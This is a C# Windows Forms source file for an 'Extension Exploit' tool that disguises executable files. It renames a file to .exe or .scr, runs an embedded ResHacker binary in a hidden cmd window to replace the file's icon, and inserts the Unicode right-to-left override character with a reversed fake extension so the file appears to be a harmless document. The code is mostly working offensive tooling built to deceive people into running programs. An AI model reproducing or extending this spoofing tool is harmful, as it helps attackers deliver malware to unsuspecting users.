using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace Extension_Exploit
{
    public partial class Form1 : Form
    {
        private string strFullFileName;
        private string strFullIconName;

        public Form1()
        {
            InitializeComponent();
        }

        private void BackUpFile()
        {
            string[] temp;
            string strNewFileName;

            temp = strFullFileName.Split('.');
            strNewFileName = temp[0] + "_original" + "." + temp[1];
            File.Copy(strFullFileName, strNewFileName);
        }

        private void ChangeExtention()
        {
            string[] temp;
            string strNewFileName;

            temp = strFullFileName.Split('.');
            strNewFileName = (exeRadioButton.Checked==true ? temp[0] + ".exe" : temp[0] + ".scr");
            File.Move(strFullFileName, strNewFileName);
            strFullFileName = strNewFileName;
        }

        private void ChangeIcon()
        {
            if (strFullIconName == null)
                return;

            System.IO.File.WriteAllBytes("ResHacker.exe", Properties.Resources.ResHacker);


            ProcessStartInfo _ProcessStartInfo = new ProcessStartInfo();
            _ProcessStartInfo.FileName = "cmd.exe";

            _ProcessStartInfo.Arguments = "/c ResHacker.exe -addoverwrite \"" + strFullFileName + "\", \"" + strFullFileName + "\", \""
                + strFullIconName + "\", ICONGROUP, MAINICON, 0";

            _ProcessStartInfo.UseShellExecute = false;
            _ProcessStartInfo.CreateNoWindow = true;

            Process cmd = new Process();
            cmd.StartInfo = _ProcessStartInfo;
            cmd.Start();
            cmd.WaitForExit();

            foreach (string strResHackerFile in Directory.GetFiles(Directory.GetCurrentDirectory(), "ResHacker*", SearchOption.TopDirectoryOnly))
            {
                File.Delete(strResHackerFile);
            }
        }
        private void ExtentionExploit(string Path2File, string Extention)
        {
            char[] ch = Extention.ToCharArray();
            Array.Reverse(ch);
            File.Move(Path2File, Path2File.Substring(0, Path2File.Length - 4) +
            (char)8238 + new string(ch) + Path2File.Substring(Path2File.Length - 4));
            
        }

        private void Reset()
        {
            filePathTextBox.Clear();
            strFullFileName = null;

            iconPictureBox.Image = null;
            strFullIconName = null;
        }
        private void openButton_Click(object sender, EventArgs e)
        {
            if (DialogResult.OK == openFileDialog1.ShowDialog())
            {
                filePathTextBox.Text = openFileDialog1.FileName;
                strFullFileName = filePathTextBox.Text;
            }
        }

        
        
        private void exploitButton_Click(object sender, EventArgs e)
        {
            try
            {
                BackUpFile();
                ChangeIcon();
                ChangeExtention();
                ExtentionExploit(strFullFileName, extentionTextBox.Text);

                Reset();

                MessageBox.Show("Exploit Successful!", "Extension Exploit", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch (NullReferenceException)
            {
                MessageBox.Show("No File Specified!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void loadIconButton_Click(object sender, EventArgs e)
        {
            if (DialogResult.OK == openFileDialog2.ShowDialog())
            {
                strFullIconName = openFileDialog2.FileName;
                
                Icon _Icon = new Icon(strFullIconName);
                iconPictureBox.Image = _Icon.ToBitmap();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            extentionTextBox.Focus();
        }

        
    }
    
}
